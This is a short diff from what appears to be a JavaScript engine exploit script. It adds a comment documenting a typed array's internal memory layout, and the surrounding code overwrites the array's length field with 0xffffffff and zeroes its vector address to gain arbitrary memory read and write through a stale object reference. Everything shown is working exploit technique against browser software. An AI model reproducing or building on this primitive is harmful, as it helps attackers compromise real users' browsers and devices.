@@ -186,7 +186,24 @@ function go_() {
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
 				
+				/*
+				Array internals:
+					void* JSCell
+					void* m_vector;
+					void* butterflyptr
+					uint32_t m_length;
+					TypedArrayMode m_mode;
+					
+					stale[0][0] == first32(JSCell)
+					stale[0][1] == second32(JSCell)
+					stale[0][2] == first32(m_Vector)
+					stale[0][3] == second32(m_Vector)
+					stale[0][4] == first32(butterflyptr)
+					stale[0][5] == second32(butterflyptr)
+					stale[0][6] == m_length
+				*/
 				stale[0][6] = 0xffffffff; // Overide m_length field
+
 				bck = stale[0][4];
 				stale[0][4] = 0; // address, low 32 bits
 				mem0 = stale[0];
